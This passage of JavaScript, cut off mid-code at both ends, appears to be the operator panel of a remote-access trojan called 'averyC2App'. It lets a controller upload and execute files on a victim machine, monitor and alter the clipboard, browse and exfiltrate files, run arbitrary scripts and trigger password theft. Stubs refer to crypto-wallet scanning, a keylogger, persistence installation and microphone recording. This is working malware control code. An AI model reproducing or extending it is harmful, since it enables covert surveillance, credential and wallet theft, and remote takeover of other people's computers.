                const progressSection = document.getElementById('progressSection');
                
                uploadBtn.disabled = true;
                executeBtn.disabled = true;
                progressSection.style.display = 'block';
                
                // Reset button text
                uploadBtn.textContent = '◤ UPLOADING... ◥';
                
                this.addExecOutput(`\nStarting upload of ${this.selectedFile.name}...`);
                
                // Read file as base64
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const base64Data = e.target.result.split(',')[1]; // Remove data:type;base64, prefix
                    const chunkSize = 512 * 1024; // 512KB chunks
                    const totalChunks = Math.ceil(base64Data.length / chunkSize);
                    
                    this.uploadedFileName = this.selectedFile.name;
                    
                    // Send file info first
                    this.ws.send(JSON.stringify({
                        type: 'file_upload_start',
                        client_id: this.selectedClient,
                        filename: this.selectedFile.name,
                        filesize: this.selectedFile.size,
                        total_chunks: totalChunks
                    }));
                    
                    // Upload chunks
                    for (let i = 0; i < totalChunks; i++) {
                        const chunk = base64Data.slice(i * chunkSize, (i + 1) * chunkSize);
                        const progress = Math.round(((i + 1) / totalChunks) * 100);
                        
                        this.updateProgress(progress);
                        
                        await this.sendFileChunk(i, chunk, i === totalChunks - 1);
                        
                        // Small delay between chunks
                        await new Promise(resolve => setTimeout(resolve, 25));
                    }
                };
                
                reader.readAsDataURL(this.selectedFile);
            }
            
            async sendFileChunk(chunkIndex, chunkData, isLast) {
                return new Promise((resolve) => {
                    this.ws.send(JSON.stringify({
                        type: 'file_chunk',
                        client_id: this.selectedClient,
                        chunk_index: chunkIndex,
                        chunk_data: chunkData,
                        is_last: isLast
                    }));
                    
                    // Simple timeout to pace uploads
                    setTimeout(resolve, 5);
                });
            }
            
            updateProgress(percent) {
                document.getElementById('progressBar').style.width = percent + '%';
                document.getElementById('progressText').textContent = percent + '%';
            }
            
            handleFileChunkAck(data) {
                // Server acknowledged chunk receipt
                if (data.chunk_index !== undefined) {
                    console.log(`Chunk ${data.chunk_index} acknowledged`);
                }
            }
            
           handleFileUploadComplete(data) {
                const uploadBtn = document.getElementById('uploadBtn');
                const executeBtn = document.getElementById('executeBtn');
                
                if (data.success) {
                    this.addExecOutput(`\nUpload complete! File saved as: ${data.filename}`, 'success');
                    
                    // Enable both buttons
                    executeBtn.disabled = false;
                    uploadBtn.disabled = false;
                    uploadBtn.textContent = '◤ UPLOAD ANOTHER FILE ◥';
                    
                    // Keep the uploaded filename for execution
                    this.uploadedFileName = data.filename;
                    
                    console.log(`Upload completed: ${data.filename}, execute button enabled: ${!executeBtn.disabled}`);
                } else {
                    this.addExecOutput(`\nUpload failed: ${data.error || 'Unknown error'}`, 'error');
                    uploadBtn.disabled = false;
                    uploadBtn.textContent = '◤ RETRY UPLOAD ◥';
                    executeBtn.disabled = true;
                }
                
                // Hide progress section
                document.getElementById('progressSection').style.display = 'none';
            }
            
            executeFile() {
                if (!this.uploadedFileName || !this.selectedClient) return;
                
                document.getElementById('executeBtn').disabled = true;
                this.addExecOutput(`\n─────────────────────────────`);
                this.addExecOutput(`Executing ${this.uploadedFileName}...`);
                this.addExecOutput(`─────────────────────────────\n`);
                
                this.ws.send(JSON.stringify({
                    type: 'execute_file',
                    client_id: this.selectedClient,
                    filename: this.uploadedFileName
                }));
            }
            
            handleExecuteResponse(data) {
                if (data.output) {
                    this.addExecOutput(`\nExecution output:\n${data.output}`, data.success ? 'success' : 'error');
                }
                
                if (data.completed) {
                    this.addExecOutput(`\nExecution completed with exit code: ${data.exit_code}`);
                    document.getElementById('executeBtn').disabled = false;
                }
            }
            
            addExecOutput(text, type = 'normal') {
                const output = document.getElementById('execOutput');
                const timestamp = new Date().toLocaleTimeString();
                let color = '#00ff00';
                
                if (type === 'error') color = '#ff0000';
                if (type === 'success') color = '#00ffff';
                
                output.innerHTML += `\n<span style="color: #666">[${timestamp}]</span> <span style="color: ${color}">${text}</span>`;
                output.scrollTop = output.scrollHeight;
            }


            openClipboardManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for clipboard manager', 'error');
        return;
    }
    
    document.getElementById('clipboardClientId').textContent = this.selectedClient;
    document.getElementById('clipboardModal').style.display = 'flex';
    
    // Initialize clipboard history
    this.clipboardHistory = [];
    this.clipboardMonitoring = false;
    
    this.addTerminalOutput(`>>> Opening clipboard manager for ${this.selectedClient}`, 'system');
}

getClipboard() {
    this.ws.send(JSON.stringify({
        type: 'get_clipboard',
        client_id: this.selectedClient
    }));
}

setClipboard() {
    const data = document.getElementById('clipboardInput').value;
    if (!data) {
        alert('Please enter text to set clipboard');
        return;
    }
    
    this.ws.send(JSON.stringify({
        type: 'set_clipboard',
        client_id: this.selectedClient,
        clipboard_data: data
    }));
}

clearClipboardInput() {
    document.getElementById('clipboardInput').value = '';
}

toggleClipboardMonitor() {
    const btn = document.getElementById('clipboardMonitorBtn');
    
    if (this.clipboardMonitoring) {
        this.ws.send(JSON.stringify({
            type: 'stop_clipboard_monitor',
            client_id: this.selectedClient
        }));
        btn.textContent = 'START MONITOR';
        btn.classList.remove('active');
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_clipboard_monitor',
            client_id: this.selectedClient
        }));
        btn.textContent = 'STOP MONITOR';
        btn.classList.add('active');
    }
    
    this.clipboardMonitoring = !this.clipboardMonitoring;
}

handleClipboardData(data) {
    document.getElementById('clipboardInput').value = data.data || '';
    this.addClipboardHistory(data.data || 'Empty clipboard');
}

handleClipboardSetResult(data) {
    if (data.success) {
        this.addTerminalOutput('>>> Clipboard set successfully', 'success');
    } else {
        this.addTerminalOutput('>>> Failed to set clipboard', 'error');
    }
}

handleClipboardChanged(data) {
    this.addClipboardHistory(data.data, new Date(data.timestamp * 1000));
    
    // Flash notification
    const input = document.getElementById('clipboardInput');
    input.value = data.data;
    input.style.borderColor = '#ffff00';
    setTimeout(() => {
        input.style.borderColor = '';
    }, 500);
}

addClipboardHistory(content, timestamp = new Date()) {
    const historyList = document.getElementById('clipboardHistory');
    
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div class="history-time">${timestamp.toLocaleString()}</div>
        <div class="history-content">${this.escapeHtml(content)}</div>
    `;
    
    item.addEventListener('click', () => {
        document.getElementById('clipboardInput').value = content;
    });
    
    historyList.insertBefore(item, historyList.firstChild);
    
    // Keep only last 50 items
    while (historyList.children.length > 50) {
        historyList.removeChild(historyList.lastChild);
    }
}

escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
            
            // File Manager Methods
            openFileManager() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for file manager', 'error');
                    return;
                }
                
                document.getElementById('fmClientId').textContent = this.selectedClient;
                document.getElementById('fmModal').style.display = 'flex';
                this.isSearching = false; // Reset search state
                
                // Get drives and initial directory
                this.ws.send(JSON.stringify({
                    type: 'fm_get_drives',
                    client_id: this.selectedClient
                }));
                
                // Navigate to C:\ by default
                this.currentPath = 'C:\\';
                document.getElementById('fmPathInput').value = this.currentPath;
                this.refreshFiles();
                
                this.addTerminalOutput(`>>> Opening file manager for ${this.selectedClient}`, 'system');
            }
            
            handleFmDrives(data) {
                const driveSelect = document.getElementById('fmDriveSelect');
                driveSelect.innerHTML = '';
                
                if (data.drives && data.drives.length > 0) {
                    data.drives.forEach(drive => {
                        const option = document.createElement('option');
                        option.value = drive;
                        option.textContent = drive;
                        driveSelect.appendChild(option);
                    });
                    
                    // Update current path if needed to match first drive
                    if (data.drives.length > 0) {
                        const firstDrive = data.drives[0];
                        this.currentPath = firstDrive.endsWith(':') ? firstDrive + '\\' : firstDrive;
                        document.getElementById('fmPathInput').value = this.currentPath;
                    }
                }
            }
            
            handleFmFiles(data) {
                this.fileList = data.files || [];
                
                // Update current path from server response if available
                if (data.path) {
                    this.currentPath = data.path;
                    document.getElementById('fmPathInput').value = this.currentPath;
                }
                
                const filesContainer = document.getElementById('fmFiles');
                filesContainer.innerHTML = '';
                
                // Add parent directory if not at root
                if (this.currentPath.length > 3) {
                    const parentItem = this.createFileItem({
                        name: '..',
                        type: 'directory',
                        size: 0,
                        modified: '',
                        isParent: true
                    });
                    filesContainer.appendChild(parentItem);
                }
                
                // Sort: directories first, then files
                this.fileList.sort((a, b) => {
                    if (a.type === 'directory' && b.type !== 'directory') return -1;
                    if (a.type !== 'directory' && b.type === 'directory') return 1;
                    return a.name.toLowerCase().localeCompare(b.name.toLowerCase());
                });
                
                // Add all files
                this.fileList.forEach(file => {
                    const item = this.createFileItem(file);
                    filesContainer.appendChild(item);
                });
                
                this.updateFmStatus(`Loaded ${this.fileList.length} items in ${this.currentPath}`);
            }
            
            createFileItem(file) {
                const item = document.createElement('div');
                item.className = 'fm-item';
                item.dataset.fileName = file.name;
                item.dataset.fileType = file.type;
                
                const icon = file.type === 'directory' ? '📁' : 
                           file.name.endsWith('.exe') ? '⚙️' :
                           file.name.endsWith('.zip') || file.name.endsWith('.rar') ? '📦' :
                           file.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i) ? '🖼️' :
                           file.name.match(/\.(mp4|avi|mkv|mov)$/i) ? '🎬' :
                           file.name.match(/\.(mp3|wav|flac|ogg)$/i) ? '🎵' :
                           file.name.match(/\.(txt|log|md)$/i) ? '📄' :
                           file.name.match(/\.(doc|docx|pdf)$/i) ? '📋' : '📎';
                
                const ext = file.name.lastIndexOf('.') > -1 ? 
                           file.name.substring(file.name.lastIndexOf('.') + 1).toUpperCase() : 
                           file.type === 'directory' ? 'FOLDER' : 'FILE';
                
                item.innerHTML = `
                    <div class="fm-item-icon">${icon}</div>
                    <div class="fm-item-name">${file.name}</div>
                    <div class="fm-item-size">${this.formatFileSize(file.size)}</div>
                    <div class="fm-item-date">${file.modified || ''}</div>
                    <div class="fm-item-type">${ext}</div>
                `;
                
                item.addEventListener('click', () => this.selectFile(file));
                item.addEventListener('dblclick', () => this.openFile(file));
                
                return item;
            }
            
            formatFileSize(bytes) {
                if (bytes === 0) return '';
                const sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(1024));
                return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
            }
            
            selectFile(file) {
                // Clear previous selection
                document.querySelectorAll('.fm-item.selected').forEach(item => {
                    item.classList.remove('selected');
                });
                
                // Select new file
                const item = document.querySelector(`[data-file-name="${file.name}"]`);
                if (item) {
                    item.classList.add('selected');
                    this.selectedFmFile = file;
                    
                    // Update buttons
                    document.getElementById('fmExecuteBtn').disabled = file.type === 'directory';
                    document.getElementById('fmDownloadBtn').disabled = file.type === 'directory';
                    document.getElementById('fmZipBtn').disabled = false; // Enable ZIP for both files and folders
                    
                    // Update status
                    document.getElementById('fmSelectedInfo').textContent = 
                        `Selected: ${file.name} (${file.type})`;
                }
            }
            
            openFile(file) {
                if (file.isParent) {
                    this.navigateUp();
                } else if (file.type === 'directory') {
                    // Ensure proper path separator
                    let newPath = this.currentPath;
                    if(this.isSearching) { // If we are in search view, use the file's full path
                        newPath = file.path.substring(0, file.path.lastIndexOf('\\') + 1);
                        this.isSearching = false; // Exit search mode
                    } else {
                         if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
                            newPath += '\\';
                        }
                        newPath += file.name;
                    }
                    
                    this.currentPath = newPath;
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.refreshFiles();
                } else if (file.name.match(/\.(exe|bat|cmd|ps1|sh)$/i)) {
                    this.executeSelected();
                }
            }
            
            changeDrive() {
                const drive = document.getElementById('fmDriveSelect').value;
                this.currentPath = drive.endsWith(':') ? drive + '\\' : drive;
                document.getElementById('fmPathInput').value = this.currentPath;
                this.refreshFiles();
            }
            
            navigateToPath() {
                const newPath = document.getElementById('fmPathInput').value.trim();
                if (newPath && newPath !== this.currentPath) {
                    this.currentPath = newPath;
                    this.refreshFiles();
                }
            }
            
            navigateUp() {
                // If in search view, go back to normal view of current path
                if(this.isSearching) {
                    this.isSearching = false;
                    this.refreshFiles();
                    return;
                }
                const parts = this.currentPath.replace(/[\\\/]+$/, '').split(/[\\\/]/);
                if (parts.length > 1) {
                    parts.pop();
                    this.currentPath = parts.join('\\') + '\\';
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.refreshFiles();
                }
            }
            
            refreshFiles() {
                this.isSearching = false;
                this.updateFmStatus('Loading files...');
                this.ws.send(JSON.stringify({
                    type: 'fm_list_files',
                    client_id: this.selectedClient,
                    path: this.currentPath
                }));
            }

            searchFiles() {
                const pattern = document.getElementById('fmSearchInput').value;
                if (!pattern.trim()) {
                    this.updateFmStatus('Please enter a search pattern.');
                    return;
                }
                this.isSearching = true;
                this.updateFmStatus(`Searching for "${pattern}" in ${this.currentPath}...`);
                document.getElementById('fmFiles').innerHTML = '<div class="loading">Searching...</div>';
                document.getElementById('fmStopSearchBtn').style.display = 'inline-block';

                this.ws.send(JSON.stringify({
                    type: 'fm_search',
                    client_id: this.selectedClient,
                    path: this.currentPath,
                    pattern: pattern
                }));
            }

            stopSearch() {
                if (!this.isSearching) return;
                this.ws.send(JSON.stringify({
                    type: 'fm_stop_search',
                    client_id: this.selectedClient
                }));
                this.handleFmSearchComplete({message: "Search stopped by user."});
            }

            handleFmSearchResult(data) {
                if (!this.isSearching) return; // Ignore results if we've stopped searching

                const filesContainer = document.getElementById('fmFiles');
                if (filesContainer.querySelector('.loading')) {
                    filesContainer.innerHTML = ''; // Clear "Searching..." message
                }
                
                const item = this.createFileItem(data.file);
                // Modify the double click to go to the file's directory
                item.addEventListener('dblclick', () => {
                    const filePath = data.file.path;
                    this.currentPath = filePath.substring(0, filePath.lastIndexOf('\\') + 1);
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.isSearching = false;
                    this.refreshFiles();
                });

                filesContainer.appendChild(item);
            }

            handleFmSearchComplete(data) {
                this.isSearching = false;
                this.updateFmStatus(data.message);
                document.getElementById('fmStopSearchBtn').style.display = 'none';

                const filesContainer = document.getElementById('fmFiles');
                if (filesContainer.querySelector('.loading')) {
                    filesContainer.innerHTML = '<div class="no-results">No files found matching the pattern.</div>';
                }
            }
            
            executeSelected() {
                if (!this.selectedFmFile || this.selectedFmFile.type === 'directory') return;
                
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.updateFmStatus(`Executing ${this.selectedFmFile.name}...`);
                
                this.ws.send(JSON.stringify({
                    type: 'fm_execute',
                    client_id: this.selectedClient,
                    path: fullPath
                }));
            }
            
            zipCurrent() {
                if (!this.selectedFmFile) {
                    this.updateFmStatus('Please select a file or folder to ZIP');
                    return;
                }
                
                // Build full path of selected item
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.updateFmStatus(`Creating ZIP archive for ${this.selectedFmFile.name}...`);
                document.getElementById('fmZipBtn').disabled = true;
                
                this.ws.send(JSON.stringify({
                    type: 'fm_zip_folder',
                    client_id: this.selectedClient,
                    path: fullPath  // Send full path of selected item
                }));
            }
            
            downloadSelected() {
                if (!this.selectedFmFile || this.selectedFmFile.type === 'directory') return;
                
                // Prevent multiple downloads
                if (document.getElementById('fmProgressModal').style.display === 'block') {
                    this.updateFmStatus('Download already in progress');
                    return;
                }
                
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.downloadFileName = this.selectedFmFile.name;
                this.downloadChunks.clear(); // Clear the Map
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = this.selectedFmFile.size || 0;
                
                // Show progress modal
                document.getElementById('fmProgressModal').style.display = 'block';
                document.getElementById('fmProgressTitle').textContent = 'Downloading File';
                document.getElementById('fmProgressInfo').textContent = `${this.selectedFmFile.name} (${this.formatFileSize(this.downloadExpectedSize)})`;
                document.getElementById('fmProgressBar').style.width = '0%';
                document.getElementById('fmProgressText').textContent = '0%';
                
                console.log(`Starting download: ${this.downloadFileName}`);
                
                this.ws.send(JSON.stringify({
                    type: 'fm_download_file',
                    client_id: this.selectedClient,
                    path: fullPath
                }));
            }
            
            handleFmFileSelect(event) {
                const file = event.target.files[0];
                if (!file) return;
                
                const maxSize = 50 * 1024 * 1024; // 50MB
                
                if (file.size > maxSize) {
                    this.updateFmStatus(`ERROR: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB). Max size is 50MB.`);
                    event.target.value = '';
                    return;
                }
                
                // Show progress modal
                document.getElementById('fmProgressModal').style.display = 'block';
                document.getElementById('fmProgressTitle').textContent = 'Uploading File';
                document.getElementById('fmProgressInfo').textContent = file.name;
                document.getElementById('fmProgressBar').style.width = '0%';
                document.getElementById('fmProgressText').textContent = '0%';
                
                // Read and upload file
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const base64Data = e.target.result.split(',')[1];
                    const chunkSize = 512 * 1024; // 512KB chunks
                    const totalChunks = Math.ceil(base64Data.length / chunkSize);
                    
                    // Send file info
                    this.ws.send(JSON.stringify({
                        type: 'fm_upload_start',
                        client_id: this.selectedClient,
                        path: this.currentPath,
                        filename: file.name,
                        filesize: file.size,
                        total_chunks: totalChunks
                    }));
                    
                    // Upload chunks
                    for (let i = 0; i < totalChunks; i++) {
                        const chunk = base64Data.slice(i * chunkSize, (i + 1) * chunkSize);
                        const progress = Math.round(((i + 1) / totalChunks) * 100);
                        
                        document.getElementById('fmProgressBar').style.width = progress + '%';
                        document.getElementById('fmProgressText').textContent = progress + '%';
                        
                        await this.sendFmFileChunk(i, chunk, i === totalChunks - 1);
                        await new Promise(resolve => setTimeout(resolve, 25));
                    }
                };
                
                reader.readAsDataURL(file);
                event.target.value = '';
            }
            
            async sendFmFileChunk(chunkIndex, chunkData, isLast) {
                return new Promise((resolve) => {
                    this.ws.send(JSON.stringify({
                        type: 'fm_upload_chunk',
                        client_id: this.selectedClient,
                        chunk_index: chunkIndex,
                        chunk_data: chunkData,
                        is_last: isLast
                    }));
                    setTimeout(resolve, 5);
                });
            }
            
            handleFmOperationResult(data) {
                this.updateFmStatus(data.message);
                
                if (data.operation === 'execute') {
                    if (data.success) {
                        this.addTerminalOutput(`>>> File executed: ${data.message}`, 'success');
                    }
                } else if (data.operation === 'zip') {
                    document.getElementById('fmZipBtn').disabled = false;
                    if (data.success) {
                        this.refreshFiles(); // Refresh to show new ZIP file
                    }
                } else if (data.operation === 'upload') {
                    document.getElementById('fmProgressModal').style.display = 'none';
                    if (data.success) {
                        this.refreshFiles(); // Refresh to show uploaded file
                    }
                }
            }
            
            handleFmDownloadStart(data) {
                this.downloadFileName = data.filename;
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = data.size || 0;
                
                console.log(`Download started: ${data.filename} (${data.size} bytes)`);
                this.updateFmStatus(`Starting download: ${data.filename}`);
            }
            
            handleFmDownloadChunk(data) {
                // Store chunk in Map for reliable ordering
                this.downloadChunks.set(data.chunk_index, data.chunk_data);
                this.downloadTotalChunks = data.total_chunks;
                
                const progress = Math.round(((data.chunk_index + 1) / data.total_chunks) * 100);
                document.getElementById('fmProgressBar').style.width = progress + '%';
                document.getElementById('fmProgressText').textContent = progress + '%';
                
                console.log(`Download chunk ${data.chunk_index + 1}/${data.total_chunks} (${progress}%) - Size: ${data.chunk_data.length}`);
                
                // Check if we have all chunks
                if (this.downloadChunks.size >= this.downloadTotalChunks) {
                    this.finalizeDownload();
                }
            }
            
            finalizeDownload() {
                console.log(`Finalizing download: ${this.downloadChunks.size}/${this.downloadTotalChunks} chunks`);
                
                // Combine chunks in correct order
                let fullData = '';
                for (let i = 0; i < this.downloadTotalChunks; i++) {
                    if (this.downloadChunks.has(i)) {
                        fullData += this.downloadChunks.get(i);
                    } else {
                        console.error(`Missing chunk ${i} in download`);
                        this.updateFmStatus(`Download failed: Missing chunk ${i}`);
                        document.getElementById('fmProgressModal').style.display = 'none';
                        return;
                    }
                }
                
                if (fullData.length === 0) {
                    console.error('No data reconstructed for download');
                    this.updateFmStatus('Download failed: No data received');
                    document.getElementById('fmProgressModal').style.display = 'none';
                    return;
                }
                
                console.log(`Combined data length: ${fullData.length} characters`);
                
                // Validate base64 data before creating blob
                try {
                    // Test decode a small portion first
                    const testChunk = fullData.substring(0, Math.min(1000, fullData.length));
                    atob(testChunk);
                    
                    // If test passes, decode the full data
                    const binaryData = atob(fullData);
                    const bytes = new Uint8Array(binaryData.length);
                    for (let i = 0; i < binaryData.length; i++) {
                        bytes[i] = binaryData.charCodeAt(i);
                    }
                    
                    const blob = new Blob([bytes]);
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = this.downloadFileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    this.updateFmStatus(`Download complete: ${this.downloadFileName} (${bytes.length} bytes)`);
                    console.log(`Download successful: ${this.downloadFileName} (${bytes.length} bytes)`);
                } catch (error) {
                    console.error('Download base64 decode error:', error);
                    this.updateFmStatus(`Download failed: Invalid data encoding - ${error.message}`);
                }
                
                document.getElementById('fmProgressModal').style.display = 'none';
                
                // Clean up
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
            }
            
            handleFmDownloadComplete(data) {
                document.getElementById('fmProgressModal').style.display = 'none';
                
                if (data.success) {
                    // Server-side finalization completed
                    if (data.saved_name) {
                        this.updateFmStatus(`Download completed and saved as: ${data.saved_name}`);
                    }
                    
                    // If we haven't finalized locally yet, try now
                    if (this.downloadChunks.size > 0 && this.downloadTotalChunks > 0) {
                        this.finalizeDownload();
                    }
                } else {
                    this.updateFmStatus(`Download failed: ${data.error || 'Unknown error'}`);
                    console.error('Download failed:', data.error);
                }
                
                // Clean up
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
            }
            
            updateFmStatus(message) {
                document.getElementById('fmStatusText').textContent = message;
            }
            
            handlePathKeypress(event) {
                if (event.key === 'Enter') {
                    this.navigateToPath();
                }
            }

            openTrollPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Troll Panel', 'error');
                    return;
                }
                
                document.getElementById('trollClientId').textContent = this.selectedClient;
                document.getElementById('trollModal').style.display = 'flex';
                
                this.addTerminalOutput(`>>> Opening Troll Panel for ${this.selectedClient}`, 'system');
            }

            sendTroll(trollType) {
                if (!this.selectedClient) return;

                let payload = {
                    type: 'send_troll',
                    client_id: this.selectedClient,
                    troll_type: trollType
                };

                switch(trollType) {
                    case 'messagebox':
                        payload.title = document.getElementById('trollMsgTitle').value;
                        payload.text = document.getElementById('trollMsgText').value;
                        if (!payload.text) {
                            alert('Message text cannot be empty.');
                            return;
                        }
                        break;
                    case 'open_url':
                        payload.url = document.getElementById('trollUrl').value;
                         if (!payload.url) {
                            alert('URL cannot be empty.');
                            return;
                        }
                        break;
                    case 'tts':
                        payload.text = document.getElementById('trollTtsText').value;
                        if (!payload.text) {
                            alert('Text to speak cannot be empty.');
                            return;
                        }
                        break;
                    default:
                        return;
                }

                this.ws.send(JSON.stringify(payload));
                this.addTerminalOutput(`>>> Sent troll command: ${trollType}`, 'system');
            }
            
            handleTrollResponse(data) {
                if (data.success) {
                    this.addTerminalOutput(`>>> Troll command '${data.troll_type}' executed successfully.`, 'success');
                } else {
                    this.addTerminalOutput(`>>> Troll command '${data.troll_type}' failed: ${data.error}`, 'error');
                }
            }

            openSysInfoPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for System Information', 'error');
                    return;
                }
                
                document.getElementById('sysInfoClientId').textContent = this.selectedClient;
                document.getElementById('sysInfoModal').style.display = 'flex';
                this.switchSysInfoTab('general', true); // Open to general tab first
                
                // Request data
                this.ws.send(JSON.stringify({
                    type: 'get_sysinfo',
                    client_id: this.selectedClient
                }));
            }

            handleSysInfoResponse(data) {
                if (data.info) {
                    this.sysInfoData = data.info;
                    this.switchSysInfoTab('general', true, true); // Re-render the general tab with data
                } else {
                    document.getElementById('sysInfoContent').innerHTML = `<div class="loading">Failed to load system info: ${data.error || 'Unknown error'}</div>`;
                }
            }
            
            switchSysInfoTab(tabName, isInitial = false, forceRender = false) {
                // Set active tab class
                if (!isInitial) {
                    document.querySelectorAll('.sysinfo-tab').forEach(tab => tab.classList.remove('active'));
                    event.target.classList.add('active');
                }

                // Only render if we have data or are forcing a render (like on initial load)
                if (!this.sysInfoData && !forceRender) {
                    return;
                }

                const contentDiv = document.getElementById('sysInfoContent');
                if (!this.sysInfoData && forceRender) {
                    contentDiv.innerHTML = '<div class="loading">Loading system information...</div>';
                    return;
                }

                let html = '';
                switch(tabName) {
                    case 'general':
                        html = `
                            <div class="sysinfo-grid">
                                <div class="sysinfo-label">Hostname:</div><div class="sysinfo-value">${this.sysInfoData.hostname || ''}</div>
                                <div class="sysinfo-label">OS:</div><div class="sysinfo-value">${this.sysInfoData.os || ''}</div>
                                <div class="sysinfo-label">Username:</div><div class="sysinfo-value">${this.sysInfoData.username || ''}</div>
                                <div class="sysinfo-label">Uptime:</div><div class="sysinfo-value">${this.sysInfoData.uptime || ''}</div>
                            </div>
                        `;
                        break;
                    case 'hardware':
                         html = `
                            <div class="sysinfo-grid">
                                <div class="sysinfo-label">CPU:</div><div class="sysinfo-value">${this.sysInfoData.cpu || ''}</div>
                                <div class="sysinfo-label">Cores:</div><div class="sysinfo-value">${this.sysInfoData.cores || ''}</div>
                                <div class="sysinfo-label">RAM:</div><div class="sysinfo-value">${this.sysInfoData.ram || ''}</div>
                                <div class="sysinfo-label">Drives:</div><div class="sysinfo-value">${(this.sysInfoData.drives || []).join('<br>')}</div>
                            </div>
                        `;
                        break;
                    case 'software':
                        html = `<table class="sysinfo-table"><thead><tr><th>Name</th><th>Version</th></tr></thead><tbody>`;
                        (this.sysInfoData.software || []).forEach(s => {
                            html += `<tr><td>${s.name}</td><td>${s.version}</td></tr>`;
                        });
                        html += `</tbody></table>`;
                        break;
                    case 'network':
                        html = `<table class="sysinfo-table"><thead><tr><th>Interface</th><th>MAC</th><th>IPs</th></tr></thead><tbody>`;
                        (this.sysInfoData.network || []).forEach(n => {
                            html += `<tr><td>${n.name}</td><td>${n.mac}</td><td>${(n.ips || []).join('<br>')}</td></tr>`;
                        });
                        html += `</tbody></table>`;
                        break;
                }
                contentDiv.innerHTML = html;
            }

            openScriptPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Script Execution', 'error');
                    return;
                }
                
                document.getElementById('scriptClientId').textContent = this.selectedClient;
                document.getElementById('scriptModal').style.display = 'flex';
                document.getElementById('scriptOutput').innerHTML = '◤ SCRIPT OUTPUT ◥';
            }

            executeCustomScript() {
                if (!this.selectedClient) return;

                const scriptType = document.getElementById('scriptType').value;
                const scriptContent = document.getElementById('scriptEditor').value;

                if (!scriptContent.trim()) {
                    alert('Script content cannot be empty.');
                    return;
                }

                document.getElementById('scriptOutput').innerHTML = 'Executing script...';

                this.ws.send(JSON.stringify({
                    type: 'execute_script',
                    client_id: this.selectedClient,
                    script_type: scriptType,
                    script_content: scriptContent
                }));
            }
            
            handleScriptResponse(data) {
                const outputDiv = document.getElementById('scriptOutput');
                if (data.success) {
                    outputDiv.textContent = data.output;
                } else {
                    outputDiv.textContent = `ERROR: ${data.error}\n\n${data.output}`;
                }
                outputDiv.scrollTop = outputDiv.scrollHeight;
            }

            startPasswordRecovery() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Password Recovery', 'error');
                    return;
                }

                if (!confirm(`Start password recovery on client ${this.selectedClient}? This may trigger security alerts.`)) {
                    return;
                }

                this.addTerminalOutput(`>>> Starting password recovery on ${this.selectedClient}...`, 'system');
                this.ws.send(JSON.stringify({
                    type: 'start_password_recovery',
                    client_id: this.selectedClient
                }));
            }

            handlePasswordRecoveryComplete(data) {
                this.addTerminalOutput(`>>> Password recovery complete for ${data.client_id}.`, 'success');
                if(data.path) {
                    this.addTerminalOutput(`>>> Files saved to: ${data.path}`, 'system');
                    this.addTerminalOutput(`>>> Opening File Manager at recovery location...`, 'system');
                    
                    // Automatically open file manager to the path
                    this.openFileManager();
                    
                    // Give a slight delay for the modal to open, then navigate
                    setTimeout(() => {
                        document.getElementById('fmPathInput').value = data.path;
                        this.navigateToPath();
                    }, 500);
                } else {
                     this.addTerminalOutput(`>>> No recovery path returned from client.`, 'error');
                }
            }
        }




        function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
}

function startWalletScan() {
    const app = window.averyC2App;
    if (app) app.startWalletScan();
}

function filterWallets(filter) {
    const app = window.averyC2App;
    if (app) app.filterWallets(filter);
}

function downloadWallet(index) {
    const app = window.averyC2App;
    if (app) app.downloadWallet(index);
}

        function closeKeyloggerModal() {
    document.getElementById('keyloggerModal').style.display = 'none';
}

function closePersistenceModal() {
    document.getElementById('persistenceModal').style.display = 'none';
}

function checkPersistence() {
    const app = window.averyC2App;
    if (app) app.checkPersistence();
}

function installPersistence(method) {
    const app = window.averyC2App;
    if (app) app.installPersistence(method);
}

function removeAllPersistence() {
    const app = window.averyC2App;
    if (app) app.removeAllPersistence();
}

function closeAudioModal() {
    const app = window.averyC2App;
    if (app && app.audioRecording) {
        app.stopRecording();
    }
    document.getElementById('audioModal').style.display = 'none';
}

function refreshAudioDevices() {
    const app = window.averyC2App;
    if (app) app.refreshAudioDevices();
}

function toggleRecording() {
    const app = window.averyC2App;
    if (app) app.toggleRecording();
}

function playAudioRecording(index) {
    const app = window.averyC2App;
    if (app) app.playAudioRecording(index);
}

function downloadAudioRecording(index) {
    const app = window.averyC2App;
    if (app) app.downloadAudioRecording(index);
}
function closeNetworkModal() {
    const app = window.averyC2App;
    if (app && app.netstatMonitoring) {
